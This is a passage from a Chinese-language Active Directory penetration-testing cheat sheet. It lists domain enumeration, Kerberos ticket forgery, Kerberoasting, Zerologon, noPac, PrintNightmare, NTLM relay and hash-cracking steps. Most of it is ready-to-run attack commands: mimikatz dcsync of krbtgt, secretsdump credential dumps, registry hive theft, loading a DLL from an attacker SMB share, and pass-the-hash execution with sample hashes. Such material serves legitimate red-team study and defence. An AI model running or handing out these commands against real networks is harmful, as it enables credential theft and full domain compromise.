computers&quot; /domain ------&gt; 列出该域内所有机器名 dsquery user domainroot -limit 65535 &amp;&amp; net user /domain------&gt;列出该域内所有用户名 dsquery subnet ------&gt;列出该域内网段划分 dsquery group &amp;&amp; net group /domain ------&gt;列出该域内分组  dsquery ou ------&gt;列出该域内组织单位  dsquery server &amp;&amp; net time /domain------&gt;列出该域内域控制器 </code></th></tr></thead></table><h3 id="第三方信息收集"><a href="#第三方信息收集" class="headerlink" title="第三方信息收集"></a><u><font style="color:#000000;">第三方信息收集</font></u></h3><ul><li><font style="color:#000000;">NETBIOS 信息收集</font></li><li><font style="color:#000000;">SMB 信息收集</font></li><li><font style="color:#000000;">空会话信息收集</font></li><li><font style="color:#000000;">漏洞信息收集等</font></li></ul><h1 id="3-获取域控的方法"><a href="#3-获取域控的方法" class="headerlink" title="3.获取域控的方法"></a><font style="color:#000000;">3.获取域控的方法</font></h1><h5 id="SYSVOL"><a href="#SYSVOL" class="headerlink" title="SYSVOL"></a><font style="color:#000000;">SYSVOL</font></h5><p><font style="color:#000000;">SYSVOL是指存储域公共文件服务器副本的共享文件夹，它们在域中所有的域控制器之间复制。 Sysvol文件夹是安装AD时创建的，它用来存放GPO、Script等信息。同时，存放在Sysvol文件夹中的信息，会复制到域中所有DC上。 相关阅读:</font></p><ul><li><a href="http://www.freebuf.com/vuls/92016.html"><font style="color:#000000;">寻找SYSVOL里的密码和攻击GPP（组策略偏好）</font></a></li><li><a href="http://blog.51cto.com/ycrsjxy/203095"><font style="color:#000000;">Windows Server 2008 R2之四管理Sysvol文件夹</font></a></li><li><a href="https://adsecurity.org/?p=2288"><font style="color:#000000;">SYSVOL中查找密码并利用组策略首选项</font></a></li><li><a href="https://xz.aliyun.com/t/1653"><font style="color:#000000;">利用SYSVOL还原组策略中保存的密码</font></a></li></ul><h5 id="MS14-068-Kerberos"><a href="#MS14-068-Kerberos" class="headerlink" title="MS14-068 Kerberos"></a><font style="color:#000000;">MS14-068 Kerberos</font></h5><table><thead><tr><th><code>plain python ms14-068.py -u 域用户@域名 -p 密码 -s 用户SID -d 域主机 </code></th></tr></thead></table><p><font style="color:#000000;">利用mimikatz将工具得到的</font><a href="mailto:TGT_domainuser@SERVER.COM.ccache"><font style="color:#000000;">TGT_domainuser@SERVER.COM.ccache</font></a><font style="color:#000000;">写入内存，创建缓存证书：</font></p><table><thead><tr><th><code>plain mimikatz.exe &quot;kerberos::ptc c:TGT_darthsidious@pentest.com.ccache&quot; exit net use k: \pentest.comc$ </code></th></tr></thead></table><p><font style="color:#000000;">相关阅读 :</font></p><ul><li><a href="http://adsecurity.org/?p=676"><font style="color:#000000;">Kerberos的工具包PyKEK</font></a></li><li><a href="http://www.freebuf.com/vuls/56081.html"><font style="color:#000000;">深入解读MS14-068漏洞</font></a></li><li><a href="https://adsecurity.org/?p=541"><font style="color:#000000;">Kerberos的安全漏洞</font></a></li></ul><h5 id="SPN扫描"><a href="#SPN扫描" class="headerlink" title="SPN扫描"></a><font style="color:#000000;">SPN扫描</font></h5><p><font style="color:#000000;">Kerberoast可以作为一个有效的方法从Active Directory中以普通用户的身份提取服务帐户凭据，无需向目标系统发送任何数据包。 SPN是服务在使用Kerberos身份验证的网络上的唯一标识符。它由服务类，主机名和端口组成。在使用Kerberos身份验证的网络中，必须在内置计算机帐户（如NetworkService或LocalSystem）或用户帐户下为服务器注册SPN。对于内部帐户，SPN将自动进行注册。但是，如果在域用户帐户下运行服务，则必须为要使用的帐户的手动注册SPN。 SPN扫描的主要好处是，SPN扫描不需要连接到网络上的每个IP来检查服务端口，SPN通过LDAP查询向域控执行服务发现，SPN查询是Kerberos的票据行为一部分，因此比较难检测SPN扫描。 相关阅读 :</font></p><ul><li><a href="https://blog.netspi.com/locate-and-attack-domain-sql-servers-without-scanning/"><font style="color:#000000;">非扫描式的SQL Server发现</font></a></li><li><a href="https://adsecurity.org/?p=1508"><font style="color:#000000;">SPN扫描</font></a></li><li><a href="https://github.com/PyroTek3/PowerShell-AD-Recon"><font style="color:#000000;">扫描SQLServer的脚本</font></a></li></ul><h5 id="Kerberos的黄金门票"><a href="#Kerberos的黄金门票" class="headerlink" title="Kerberos的黄金门票"></a><font style="color:#000000;">Kerberos的黄金门票</font></h5><p><font style="color:#000000;">在域上抓取的哈希</font></p><table><thead><tr><th><code>plain lsadump::dcsync /domain:pentest.com /user:krbtgt  kerberos::purge  kerberos::golden /admin:administrator /domain:域 /sid:SID /krbtgt:hash值  /ticket:adinistrator.kiribi  kerberos::ptt administrator.kiribi  kerberos::tgt  net use k: \pnet use k: \pentest.comc$ </code></th></tr></thead></table><p><font style="color:#000000;">相关阅读 :</font></p><ul><li><a href="https://adsecurity.org/?p=1640"><font style="color:#000000;">https://adsecurity.org/?p=1640</font></a></li><li><a href="http://bobao.360.cn/learning/detail/3564.html"><font style="color:#000000;">域服务账号破解实践</font></a></li><li><a href="https://blog.csdn.net/wulantian/article/details/42418231"><font style="color:#000000;">Kerberos的认证原理</font></a></li><li><a href="https://klionsec.github.io/2016/08/10/ntlm-kerberos/"><font style="color:#000000;">深刻理解windows安全认证机制ntlm＆Kerberos</font></a></li></ul><h5 id="Kerberos的银票务"><a href="#Kerberos的银票务" class="headerlink" title="Kerberos的银票务"></a><font style="color:#000000;">Kerberos的银票务</font></h5><p><font style="color:#000000;">黄金票据和白银票据的一些区别： Golden Ticket：伪造</font><font style="color:#000000;">TGT</font><font style="color:#000000;">，可以获取</font><font style="color:#000000;">任何Kerberos</font><font style="color:#000000;">服务权限 银票：伪造TGS，</font><font style="color:#000000;">只能访问指定的服务</font><font style="color:#000000;"> </font><font style="color:#000000;">加密方式不同： Golden Ticket由</font><font style="color:#000000;">krbtgt</font><font style="color:#000000;">的hash加密 Silver Ticket由</font><font style="color:#000000;">服务账号</font><font style="color:#000000;">（通常为计算机账户）Hash加密 认证流程不同： 金票在使用的过程需要同域控通信 银票在使用的过程不需要同域控通信 相关阅读 :</font></p><ul><li><a href="https://adsecurity.org/?p=2011"><font style="color:#000000;">攻击者如何使用Kerberos的银票来利用系统</font></a></li><li><font style="color:#000000;">[域渗透——Pass The Ticket](</font><a href="https://www.feiworks.com/wy/drops/%E5%9F%9F%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Pass"><font style="color:#000000;">https://www.feiworks.com/wy/drops/域渗透——Pass</font></a><font style="color:#000000;"> </font><font style="color:#000000;">The Ticket.pdf)</font></li></ul><h5 id="域服务账号破解"><a href="#域服务账号破解" class="headerlink" title="域服务账号破解"></a><font style="color:#000000;">域服务账号破解</font></h5><p><font style="color:#000000;">与上面SPN扫描类似的原理</font><font style="color:#000000;"> </font><a href="https://github.com/nidem/kerberoast"><font style="color:#000000;">https://github.com/nidem/kerberoast</font></a><font style="color:#000000;"> </font><font style="color:#000000;">获取所有用作SPN的帐户</font></p><table><thead><tr><th><code>plain setspn -T PENTEST.com -Q */* </code></th></tr></thead></table><p><font style="color:#000000;">从Mimikatz的RAM中提取获得的门票</font></p><table><thead><tr><th><code>plain kerberos::list /export </code></th></tr></thead></table><p><font style="color:#000000;">用rgsrepcrack破解</font></p><table><thead><tr><th><code>plain tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi </code></th></tr></thead></table><h5 id="凭证盗窃"><a href="#凭证盗窃" class="headerlink" title="凭证盗窃"></a><font style="color:#000000;">凭证盗窃</font></h5><p><font style="color:#000000;">从搜集的密码里面找管理员的密码</font></p><h5 id="NTLM-relay"><a href="#NTLM-relay" class="headerlink" title="NTLM relay"></a><font style="color:#000000;">NTLM relay</font></h5><ul><li><a href="https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/"><font style="color:#000000;">One API call away from Domain Admin</font></a></li><li><a href="https://github.com/dirkjanm/privexchange/"><font style="color:#000000;">privexchange</font></a></li><li><a href="https://github.com/ridter/exchange2domain"><font style="color:#000000;">Exchange2domain</font></a></li></ul><p><font style="color:#000000;">用于主动让目标机器发起NTLM请求的方法：</font></p><ul><li><a href="https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py"><font style="color:#000000;">printerbug</font></a></li><li><a href="https://github.com/topotam/PetitPotam"><font style="color:#000000;">PetitPotam</font></a></li></ul><p><font style="color:#000000;">Relay LDAP:</font></p><ul><li><a href="https://github.com/Ridter/CVE-2019-1040-dcpwn"><font style="color:#000000;">CVE-2019-1040-dcpwn</font></a></li></ul><p><font style="color:#000000;">Relay AD CS&#x2F;PKI:</font></p><ul><li><a href="https://www.bussink.net/ad-cs-exploit-via-petitpotam-from-0-to-domain-domain/"><font style="color:#000000;">AD CS&#x2F;PKI template exploit</font></a></li></ul><p><font style="color:#000000;">集成几个利用的工具：</font></p><ul><li><a href="https://github.com/Ridter/Relayx"><font style="color:#000000;">Relayx</font></a></li></ul><p><font style="color:#000000;">内网445端口转发：</font></p><ul><li><a href="https://github.com/praetorian-inc/PortBender"><font style="color:#000000;">PortBender</font></a></li></ul><h5 id="Kerberos委派"><a href="#Kerberos委派" class="headerlink" title="Kerberos委派"></a><font style="color:#000000;">Kerberos委派</font></h5><ul><li><a href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html"><font style="color:#000000;">Wagging-the-Dog.html</font></a></li><li><a href="https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/"><font style="color:#000000;">s4u2pwnage</font></a></li><li><a href="https://xz.aliyun.com/t/2931"><font style="color:#000000;">Attacking Kerberos Delegation</font></a></li><li><a href="https://adsecurity.org/?p=4056"><font style="color:#000000;">用打印服务获取域控</font></a></li><li><a href="https://www.harmj0y.net/blog/activedirectory/a-case-study-in-wagging-the-dog-computer-takeover/"><font style="color:#000000;">Computer Takeover</font></a></li><li><a href="https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/"><font style="color:#000000;">Combining NTLM Relaying and Kerberos delegation</font></a></li><li><a href="https://dirkjanm.io/exploiting-CVE-2019-1040-relay-vulnerabilities-for-rce-and-domain-admin/"><font style="color:#000000;">CVE-2019-1040</font></a></li></ul><h5 id="地址解析协议"><a href="#地址解析协议" class="headerlink" title="地址解析协议"></a><font style="color:#000000;">地址解析协议</font></h5><p><font style="color:#000000;">实在搞不定再搞ARP</font></p><h5 id="zerologon漏洞"><a href="#zerologon漏洞" class="headerlink" title="zerologon漏洞"></a><font style="color:#000000;">zerologon漏洞</font></h5><table><thead><tr><th><code>plain python3 cve-2020-1472-exploit.py &lt;MACHINE_BIOS_NAME&gt; &lt;ip&gt;  secretsdump.py &lt;DOMAIN&gt;/&lt;MACHINE_BIOS_NAME&gt;\$@&lt;IP&gt; -no-pass -just-dc-user &quot;Administrator&quot;   secretsdump.py -hashes :&lt;HASH_admin&gt; &lt;DOMAIN&gt;/Administrator@&lt;IP&gt;  python3 restorepassword.py -target-ip &lt;IP&gt; &lt;DOMAIN&gt;/&lt;MACHINE_BIOS_NAME&gt;@&lt;MACHINE_BIOS_NAME&gt; -hexpass &lt;HEXPASS&gt; </code></th></tr></thead></table><p><a href="https://0range-x.github.io/2021/11/22/CVE-2020-1472/"><font style="color:#000000;">CVE-2020-1472的分析与复现 (0range-x.github.io)</font></a></p><p><font style="color:#000000;">**1、利用Mimikatz **check</font></p><table><thead><tr><th><code>plain lsadump::zerologon /target:dc1.exploit.local /account:dc1$ </code></th></tr></thead></table><p><strong><font style="color:#000000;">exploit</font></strong></p><table><thead><tr><th><code>plain lsadump::zerologon /target:dc1.exploit.local /account:dc1$ /exploit </code></th></tr></thead></table><p><strong><font style="color:#000000;">dcsync</font></strong></p><table><thead><tr><th><code>plain lsadump::dcsync /dc:dc1.exploit.local /authuser:dc1$ /authdomain:exploit.local /authpassword:&quot;&quot; /domain:exploit.local /authntlm /user:krbtgt </code></th></tr></thead></table><p><strong><font style="color:#000000;">restore</font></strong></p><table><thead><tr><th><code>plain lsadump::postzerologon /target:conttosson.locl /account:dc$ </code></th></tr></thead></table><p><strong><font style="color:#000000;">2、利用impacket：</font></strong></p><ul><li><font style="color:#000000;">取目标主机名+IP</font></li><li><font style="color:#000000;">install 修改版本的impacket</font></li><li><font style="color:#000000;">Exp</font></li></ul><table><thead><tr><th><code>plain python cve-2020-1472-exploit.py DC2008 10.211.55.200 </code></th></tr></thead></table><p><img src="https://camo.githubusercontent.com/ab6ebf37bf1f547e4dd044b0ffb16f8493190a988f350bc7119c5c335b7c95be/68747470733a2f2f626c6f67706963732d313235313639313238302e66696c652e6d7971636c6f75642e636f6d2f696d67732f32303230303931363139303133372e706e67"></p><table><thead><tr><th><code>plain secretsdump.py -no-pass cgdomain.com/&#39;DC2008$&#39;@10.211.55.200 -history -just-dc-user administrator secretsdump.py -no-pass cgdomain.com/administrator@10.211.55.200 -hashes aad3b435b51404eeaad3b435b51404ee:3add1560657a19b3166247eb3eb149ae </code></th></tr></thead></table><p><img src="https://camo.githubusercontent.com/d94bd9f15fb2db6a2b99b7463de0674117fb227d731c7d0d8526ee66bb66961d/68747470733a2f2f626c6f67706963732d313235313639313238302e66696c652e6d7971636c6f75642e636f6d2f696d67732f32303230303931363139303335392e706e67"></p><p><font style="color:#000000;">获取到旧的密码明文hex，还原</font></p><table><thead><tr><th><code>plain python restorepassword.py cgdomain.com/DC2008@DC2008 -target-ip 10.211.55.200 -hexpass 59958639cbdd4523de5d42b01adb0e256e0d39aef14c8eef31f4c078862109f253bbb7b3817ab123d013856c028fa4993f5f5b9a830a3a98d87483b29df3fb55082a1f464b19220a2c04f6605d2d321a04afbb551f8f19a13d399f9f5af2aa23c5b76b49001033516fefd90cb0348256e8282b22cbf9e70d82a8b8d2916d578246e288af3af727533d36ad8950fe1c513771377d98a947c4a8eae2b581a74b6687a2e533b7e89e8d03c2e6c2123d519489869a6e33d3a8884be33107060b62e2852502261f48c097ddb68750cc55b7688cc951441cf02989a307f55c008e978edbaf31766d17b53505016c7580cb480b </code></th></tr></thead></table><p><img src="https://camo.githubusercontent.com/206012e6d64974e4fda0704c8f1334e777a44f37f7b517e7d8776fbb79921e3f/68747470733a2f2f626c6f67706963732d313235313639313238302e66696c652e6d7971636c6f75642e636f6d2f696d67732f32303230303931363139303435372e706e67"></p><p><font style="color:#000000;">恢复方法2</font></p><p><font style="color:#000000;">通过wmic, pass the hash 拿到域控制器中的本地管理员权限(域管)</font></p><table><thead><tr><th><code>plain wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8adfc85c3490040e942ae1e6c68f645e test.local/Administrator@10.211.55.38 </code></th></tr></thead></table><p><font style="color:#000000;">然后分别执行,拷贝本机中SAM数据库到本地</font></p><table><thead><tr><th><code>plain - reg save HKLM\SYSTEM system.save - reg save HKLM\SAM sam.save - reg save HKLM\SECURITY security.save - get system.save - get sam.save - get security.save - del /f system.save - del /f sam.save - del /f security.save </code></th></tr></thead></table><p><font style="color:#000000;">提取明文hash</font></p><table><thead><tr><th><code>plain secretsdump.py -sam sam.save -system system.save -security security.save LOCAL </code></th></tr></thead></table><p><font style="color:#000000;">然后恢复。</font></p><h5 id="CVE-2021-42278-CVE-2021-42287"><a href="#CVE-2021-42278-CVE-2021-42287" class="headerlink" title="CVE-2021-42278 &amp;&amp; CVE-2021-42287"></a><font style="color:#000000;">CVE-2021-42278 &amp;&amp; CVE-2021-42287</font></h5><p><a href="https://github.com/WazeHell/sam-the-admin"><font style="color:#000000;">sam-the-admin</font></a></p><p><a href="https://github.com/cube0x0/noPac"><font style="color:#000000;">noPac: CVE-2021-42287&#x2F;CVE-2021-42278</font></a></p><table><thead><tr><th><code>plain ./noPac.exe -domain dc.com -user username -pass &#39;password&#39; /dc owa.dc.com /mAccount mAusername /mPassword password /service cifs /ptt </code></th></tr></thead></table><h1 id="4-列出可匿名访问的SMB共享"><a href="#4-列出可匿名访问的SMB共享" class="headerlink" title="4.列出可匿名访问的SMB共享"></a><font style="color:#000000;">4.列出可匿名访问的SMB共享</font></h1><table><thead><tr><th><code>plain enum4linux -a -u &quot;&quot; -p &quot;&quot; &lt;dc-ip&gt; &amp;&amp; enum4linux -a -u &quot;guest&quot; -p &quot;&quot; &lt;dc-ip&gt;  smbmap -u &quot;&quot; -p &quot;&quot; -P 445 -H &lt;dc-ip&gt; &amp;&amp; smbmap -u &quot;guest&quot; -p &quot;&quot; -P 445 -H &lt;dc-ip&gt;  smbclient -U &#39;%&#39; -L //&lt;dc-ip&gt; &amp;&amp; smbclient -U &#39;guest%&#39; -L //&lt;dc-ip&gt;  cme smb &lt;ip&gt; -u &#39;&#39; -p &#39;&#39; # 枚举可空Session访问的SMB共享  cme smb &lt;ip&gt; -u &#39;a&#39; -p &#39;&#39; #枚举可匿名访问的SMB共享 </code></th></tr></thead></table><h1 id="5-枚举LDAP"><a href="#5-枚举LDAP" class="headerlink" title="5.枚举LDAP"></a><font style="color:#000000;">5.枚举LDAP</font></h1><table><thead><tr><th><code>plain nmap -n -sV --script &quot;ldap* and not brute&quot; -p 389 &lt;dc-ip&gt;  ldapsearch -x -h &lt;ip&gt; -s base </code></th></tr></thead></table><h1 id="6-查找用户名"><a href="#6-查找用户名" class="headerlink" title="6.查找用户名"></a><font style="color:#000000;">6.查找用户名</font></h1><p>| <code>plain enum4linux -U &lt;dc-ip&gt; | grep &#39;user:&#39;  crackmapexec smb &lt;ip&gt; -u &lt;user&gt; -p &#39;&lt;password&gt;&#39; --users   nmap -p 88 --script=krb5-enum-users --script-args=&quot;krb5-enum-users.realm=&#39;&lt;domain&gt;&#39;,userdb=&lt;users_list_file&gt;&quot; &lt;ip&gt;   OSINT - 在互联网上寻找用户名 </code>  |<br>| — |</p><h2 id="得到账号，但是没有密码"><a href="#得到账号，但是没有密码" class="headerlink" title="得到账号，但是没有密码"></a><font style="color:#000000;">得到账号，但是没有密码</font></h2><h3 id="密码喷洒"><a href="#密码喷洒" class="headerlink" title="密码喷洒"></a><u><font style="color:#000000;">密码喷洒</font></u></h3><table><thead><tr><th><code>plain 获取域密码策略 ： crackmapexec &lt;IP&gt; -u &#39;user&#39; -p &#39;password&#39; --pass-pol enum4linx -u &#39;username&#39; -p &#39;password&#39; -P &lt;IP&gt;  cme smb &lt;dc-ip&gt; -u user.txt -p password.txt --no-bruteforce # 不爆破，只测试单一的 user=password  cme smb &lt;dc-ip&gt; -u user.txt -p password.txt # 交叉爆破，根据密码策略，失败过多可能会被封禁 </code></th></tr></thead></table><h3 id="ASREP-Roasting攻击"><a href="#ASREP-Roasting攻击" class="headerlink" title="ASREP-Roasting攻击"></a><u><font style="color:#000000;">ASREP-Roasting攻击</font></u></h3><h4 id="获取hash"><a href="#获取hash" class="headerlink" title="获取hash"></a><font style="color:#000000;">获取hash</font></h4><table><thead><tr><th><code>plain python GetNPUsers.py &lt;domain&gt;/ -usersfile &lt;usernames.txt&gt; -format hashcat -outputfile &lt;hashes.domain.txt&gt;  Rubeus asreproast /format:hashcat </code></th></tr></thead></table><h4 id="获取ASREP-Roastable账号"><a href="#获取ASREP-Roastable账号" class="headerlink" title="获取ASREP-Roastable账号"></a><font style="color:#000000;">获取ASREP-Roastable账号</font></h4><table><thead><tr><th><code>plain Get-DomainUser -PreauthNotRequired -Properties SamAccountName  MATCH (u:User &#123;dontreqpreauth:true&#125;), (c:Computer), p=shortestPath((u)-[*1..]-&gt;(c)) RETURN p </code></th></tr></thead></table><h2 id="拿到任意一个域用户的账号密码"><a href="#拿到任意一个域用户的账号密码" class="headerlink" title="拿到任意一个域用户的账号密码"></a><font style="color:#000000;">拿到任意一个域用户的账号密码</font></h2><h3 id="获取其他账户密码"><a href="#获取其他账户密码" class="headerlink" title="获取其他账户密码"></a><u><font style="color:#000000;">获取其他账户密码</font></u></h3><h4 id="1-获取域内所有账户名"><a href="#1-获取域内所有账户名" class="headerlink" title="1.获取域内所有账户名"></a><font style="color:#000000;">1.获取域内所有账户名</font></h4><table><thead><tr><th><code>plain GetADUsers.py -all -dc-ip &lt;dc_ip&gt; &lt;domain&gt;/&lt;username&gt; </code></th></tr></thead></table><h4 id="2-枚举-SMB-共享"><a href="#2-枚举-SMB-共享" class="headerlink" title="2.枚举 SMB 共享"></a><font style="color:#000000;">2.枚举 SMB 共享</font></h4><table><thead><tr><th><code>plain cme smb &lt;ip&gt; -u &lt;user&gt; -p &lt;password&gt; --shares </code></th></tr></thead></table><h4 id="3-bloodhound"><a href="#3-bloodhound" class="headerlink" title="3.bloodhound"></a><font style="color:#000000;">3.bloodhound</font></h4><table><thead><tr><th><code>plain bloodhound-python -d &lt;domain&gt; -u &lt;user&gt; -p &lt;password&gt; -gc &lt;dc&gt; -c all </code></th></tr></thead></table><h4 id="4-powerview-pywerview"><a href="#4-powerview-pywerview" class="headerlink" title="4.powerview &#x2F; pywerview"></a><font style="color:#000000;">4.powerview &#x2F; pywerview</font></h4><h3 id="Kerberoasting攻击"><a href="#Kerberoasting攻击" class="headerlink" title="Kerberoasting攻击"></a><u><font style="color:#000000;">Kerberoasting攻击</font></u></h3><h4 id="获取hash-1"><a href="#获取hash-1" class="headerlink" title="获取hash"></a><font style="color:#000000;">获取hash</font></h4><table><thead><tr><th><code>plain GetUserSPNs.py -request -dc-ip &lt;dc_ip&gt; &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;  Rubeus kerberoast </code></th></tr></thead></table><h4 id="查找-kerberoastable-账号"><a href="#查找-kerberoastable-账号" class="headerlink" title="查找 kerberoastable 账号"></a><font style="color:#000000;">查找 kerberoastable 账号</font></h4><table><thead><tr><th><code>plain Get-DomainUser -SPN -Properties SamAccountName, ServicePrincipalName  MATCH (u:User &#123;hasspn:true&#125;) RETURN u  MATCH (u:User &#123;hasspn:true&#125;), (c:Computer), p=shortestPath((u)-[*1..]-&gt;(c)) RETURN p </code></th></tr></thead></table><h3 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a><u><font style="color:#000000;">MS14-068</font></u></h3><p><font style="color:#000000;">FindSMB2UPTime.py</font></p><table><thead><tr><th><code>plain rpcclient $&gt; lookupnames &lt;name&gt;  wmic useraccount get name,sid  auxiliary/admin/kerberos/ms14_068_kerberos_checksum </code></th></tr></thead></table><table><thead><tr><th><code>plain goldenPac.py -dc-ip &lt;dc_ip&gt; &lt;domain&gt;/&lt;user&gt;:&#39;&lt;password&gt;&#39;@&lt;target&gt; </code></th></tr></thead></table><table><thead><tr><th><code>plain kerberos::ptc &quot;&lt;ticket&gt;&quot; </code></th></tr></thead></table><h3 id="PrintNightmare"><a href="#PrintNightmare" class="headerlink" title="PrintNightmare"></a><u><font style="color:#000000;">PrintNightmare</font></u></h3><table><thead><tr><th><code>plain CVE-2021-1675.py &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;target&gt; &#39;\\&lt;smb_server_ip&gt;\&lt;share&gt;\inject.dll&#39; </code></th></tr></thead></table><h3 id="枚举-DNS-服务器"><a href="#枚举-DNS-服务器" class="headerlink" title="枚举 DNS 服务器"></a><u><font style="color:#000000;">枚举 DNS 服务器</font></u></h3><table><thead><tr><th><code>plain dnstool.py -u &#39;DOMAIN\user&#39; -p &#39;password&#39; --record &#39;*&#39; --action query &lt;dc_ip&gt; </code></th></tr></thead></table><h1 id="7-relay-poisoning攻击"><a href="#7-relay-poisoning攻击" class="headerlink" title="7.relay&#x2F;poisoning攻击"></a><font style="color:#000000;">7.relay&#x2F;poisoning攻击</font></h1><h3 id="扫描没开启SMB签名的机器"><a href="#扫描没开启SMB签名的机器" class="headerlink" title="扫描没开启SMB签名的机器"></a><u><font style="color:#000000;">扫描没开启SMB签名的机器</font></u></h3><table><thead><tr><th><code>plain nmap -Pn -sS -T4 --open --script smb-security-mode -p445 ADDRESS/MASK  use exploit/windows/smb/smb_relay  cme smb $hosts --gen-relay-list relay.txt </code></th></tr></thead></table><h3 id="PetitPotam"><a href="#PetitPotam" class="headerlink" title="PetitPotam"></a><u><font style="color:#000000;">PetitPotam</font></u></h3><table><thead><tr><th><code>plain PetitPotam.py  -d &lt;domain&gt; &lt;listener_ip&gt; &lt;target_ip&gt; </code></th></tr></thead></table><p><font style="color:#000000;">后续可以跟着adcs攻击</font></p><h3 id="监听"><a href="#监听" class="headerlink" title="监听"></a><u><font style="color:#000000;">监听</font></u></h3><table><thead><tr><th><code>plain responder -i eth0 mitm6 -d &lt;domain&gt; </code></th></tr></thead></table><h2 id="无SMB签名-开启IPv6-ADCS"><a href="#无SMB签名-开启IPv6-ADCS" class="headerlink" title="无SMB签名 || 开启IPv6 || ADCS"></a><font style="color:#000000;">无SMB签名 || 开启IPv6 || ADCS</font></h2><h3 id="1-MS08-068"><a href="#1-MS08-068" class="headerlink" title="1.MS08-068"></a><u><font style="color:#000000;">1.MS08-068</font></u></h3><table><thead><tr><th><code>plain use exploit/windows/smb/smb_relay #常用于windows2003 / windows server2008 </code></th></tr></thead></table><table><thead><tr><th><code>plain responder -I eth0 # 记得先关闭本机的 smb 和 http 服务  ntlmrelayx.py -tf targets.txt </code></th></tr></thead></table><h3 id="2-mitm6-i-eth0-d"><a href="#2-mitm6-i-eth0-d" class="headerlink" title="2.mitm6 -i eth0 -d"></a><u><font style="color:#000000;">2.mitm6 -i eth0 -d</font></u></h3><table><thead><tr><th><code>plain ntlmrelayx.py -6 -wh &lt;attacker_ip&gt; -l /tmp -socks -debug  ntlmrelayx.py -6 -wh &lt;attacker_ip&gt; -t smb://&lt;target&gt; -l /tmp -socks -debug  ntlmrelayx.py -t ldaps://&lt;dc_ip&gt; -wh &lt;attacker_ip&gt; --delegate-access  getST.py -spn cifs/&lt;target&gt; &lt;domain&gt;/&lt;netbios_name&gt;\$ -impersonate &lt;user&gt; </code></th></tr></thead></table><h3 id="3-adcs"><a href="#3-adcs" class="headerlink" title="3.adcs"></a><u><font style="color:#000000;">3.adcs</font></u></h3><table><thead><tr><th><code>plain ntlmrelayx.py -t http://&lt;dc_ip&gt;/certsrv/certfnsh.asp -debug -smb2support --adcs --template DomainController  Rubeus.exe asktgt /user:&lt;user&gt; /certificate:&lt;base64-certificate&gt; /ptt </code></th></tr></thead></table><h2 id="拿到hash破解"><a href="#拿到hash破解" class="headerlink" title="拿到hash破解"></a><font style="color:#000000;">拿到hash破解</font></h2><h4 id="1-LM"><a href="#1-LM" class="headerlink" title="1.LM"></a><font style="color:#000000;">1.LM</font></h4><table><thead><tr><th><code>plain john --format=lm hash.txt  hashcat -m 3000 -a 3 hash.txt </code></th></tr></thead></table><h4 id="2-NTLM"><a href="#2-NTLM" class="headerlink" title="2.NTLM"></a><font style="color:#000000;">2.NTLM</font></h4><table><thead><tr><th><code>plain john --format=nt hash.txt  hashcat -m 1000 -a 3 hash.txt </code></th></tr></thead></table><h4 id="3-NTLMv1"><a href="#3-NTLMv1" class="headerlink" title="3.NTLMv1"></a><font style="color:#000000;">3.NTLMv1</font></h4><table><thead><tr><th><code>plain john --format=netntlm hash.txt  hashcat -m 5500 -a 3 hash.txt </code></th></tr></thead></table><h4 id="4-NTLMv2"><a href="#4-NTLMv2" class="headerlink" title="4.NTLMv2"></a><font style="color:#000000;">4.NTLMv2</font></h4><table><thead><tr><th><code>plain john --format=netntlmv2 hash.txt  hashcat -m 5600 -a 0 hash.txt rockyou.txt </code></th></tr></thead></table><h4 id="5-Kerberos-5-TGS"><a href="#5-Kerberos-5-TGS" class="headerlink" title="5.Kerberos 5 TGS"></a><font style="color:#000000;">5.Kerberos 5 TGS</font></h4><table><thead><tr><th><code>plain john spn.txt --format=krb5tgs --wordlist=rockyou.txt  hashcat -m 13100 -a 0 spn.txt rockyou.txt </code></th></tr></thead></table><h4 id="6-Kerberos-ASREP"><a href="#6-Kerberos-ASREP" class="headerlink" title="6.Kerberos ASREP"></a><font style="color:#000000;">6.Kerberos ASREP</font></h4><table><thead><tr><th><code>plain hashcat -m 18200 -a 0 AS-REP_roast-hashes rockyou.txt </code></th></tr></thead></table><h1 id="9-横向移动"><a href="#9-横向移动" class="headerlink" title="9.横向移动"></a><font style="color:#000000;">9.横向移动</font></h1><h2 id="1-PTH"><a href="#1-PTH" class="headerlink" title="1.PTH"></a><font style="color:#000000;">1.PTH</font></h2><table><thead><tr><th><code>bash psexec.py -hashes &quot;:&lt;hash&gt;&quot; &lt;user&gt;@&lt;ip&gt;  wmiexec.py -hashes &quot;:&lt;hash&gt;&quot; &lt;user&gt;@&lt;ip&gt;  atexec.py -hashes &quot;:&lt;hash&gt;&quot; &lt;user&gt;@&lt;ip&gt; &quot;command&quot;  evil-winrm -i &lt;ip&gt;/&lt;domain&gt; -u &lt;user&gt; -H &lt;hash&gt;  xfreerdp /u:&lt;user&gt; /d:&lt;domain&gt; /pth:&lt;hash&gt; /v:&lt;ip&gt; </code></th></tr></thead></table><h2 id="2-PTK"><a href="#2-PTK" class="headerlink" title="2.PTK"></a><font style="color:#000000;">2.PTK</font></h2><p>| <code>bash python getTGT.py &lt;domain&gt;/&lt;user&gt; -hashes :&lt;hashes&gt; export KRB5CCNAME=/root/impacket-examples/domain_ticket.ccache python psexec.py &lt;domain&gt;/&lt;user&gt;@&lt;ip&gt; -k -no-pass  Rubeus asktgt /user:victim /rc4:&lt;rc4value&gt; Rubeus ptt /ticket:&lt;ticket&gt; Rubeus createnetonly /program:C:\Windows\System32\[cmd.exe||upnpcont.exe] Rubeus ptt /luid:0xdeadbeef /ticket:&lt;ticket&gt; </code>  |<br>| — |</p><h2 id="3-非约束委派"><a href="#3-非约束委派" class="headerlink" title="3.非约束委派"></a><font style="color:#000000;">3.非约束委派</font></h2><h3 id="获取票据"><a href="#获取票据" class="headerlink" title="获取票据"></a><u><font style="color:#000000;">获取票据</font></u></h3><table><thead><tr><th><code>plain privilege::debug sekurlsa::tickets /export sekurlsa::tickets /export  Rubeus dump /service:krbtgt /nowrap  Rubeus 